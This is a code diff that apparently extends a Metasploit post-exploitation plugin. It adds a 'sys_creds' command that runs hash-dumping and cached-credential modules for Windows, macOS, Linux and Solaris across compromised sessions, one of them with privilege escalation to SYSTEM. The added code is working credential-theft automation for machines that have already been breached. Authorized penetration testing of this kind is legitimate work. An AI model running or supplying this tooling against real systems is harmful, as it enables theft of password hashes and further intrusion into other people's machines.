@@ -33,16 +33,69 @@ class Plugin::Postauto < Msf::Plugin
 				'multi_post'         => "Run a post module against specified sessions.",
 				'multi_post_rc'      => "Run resource file with post modules and options against specified sessions.",
 				'multi_meter_cmd'    => "Run a Meterpreter Console Command against specified sessions.",
-				'multi_meter_cmd_rc' => "Run resource file with Meterpreter Console Commands against specified sessions."
+				'multi_meter_cmd_rc' => "Run resource file with Meterpreter Console Commands against specified sessions.",
+				"sys_creds"          => "Run system password collection modules against specified sessions."
 
 			}
 		end
 
+		# sys_creds Command
+		#-------------------------------------------------------------------------------------------
+		def cmd_sys_creds(*args)
+			opts = Rex::Parser::Arguments.new(
+				"-s"   => [ true,	"Sessions to run module against. Example <all> or <1,2,3,4>"],
+				"-h"   => [ false,  "Command Help"]
+			)
+
+			cred_mods = [
+				{"mod" => "windows/gather/cachedump", "opt" => nil},
+				{"mod" => "windows/gather/smart_hashdump", "opt" => "GETSYSTEM=true"},
+				{"mod" => "osx/gather/hashdump", "opt" => nil},
+				{"mod" => "linux/gather/hashdump", "opt" => nil},
+				{"mod" => "solaris/gather/hashdump", "opt" => nil},
+			]
+
+			# Parse options
+			sessions = nil
+			opts.parse(args) do |opt, idx, val|
+				case opt
+				when "-s"
+					sessions = val
+				end
+			end
+
+			cred_mods.each do |p|
+				m = framework.post.create(p["mod"])
+
+				# Set Sessions to be processed
+				if sessions =~ /all/i
+					session_list = m.compatible_sessions
+				else
+					session_list = sessions.split(",")
+				end
+				session_list.each do |s|
+					if m.session_compatible?(s.to_i)
+						m.datastore['SESSION'] = s.to_i
+						if p['opt']
+							opt_pair = p['opt'].split("=",2)
+							m.datastore[opt_pair[0]] = opt_pair[1]
+						end
+						m.options.validate(m.datastore)
+						print_status("")
+						print_status("Running #{p['mod']} against #{s}")
+						m.run_simple(
+							'LocalInput'    => driver.input,
+							'LocalOutput'    => driver.output
+						)
+					end
+				end
+			end
+		end
 		# Multi_post Command
 		#-------------------------------------------------------------------------------------------
 		def cmd_multi_post(*args)
 			opts = Rex::Parser::Arguments.new(
-				"-s"   => [ true,   "Sessions to run module against. Example <all> or <1,2,3,4>"],
+				"-s"   => [ true,	"Sessions to run module against. Example <all> or <1,2,3,4>"],
 				"-m"   => [ true,   "Module to run against sessions."],
 				"-o"   => [ true,   "Module options."],
 				"-h"   => [ false,  "Command Help"]
@@ -214,7 +267,7 @@ class Plugin::Postauto < Msf::Plugin
 			else
 				sessions = session.split(",")
 			end
-			
+
 			sessions.each do |s|
 				# Check if session is in the current session list.
 				next if not current_sessions.include?(s.to_i)
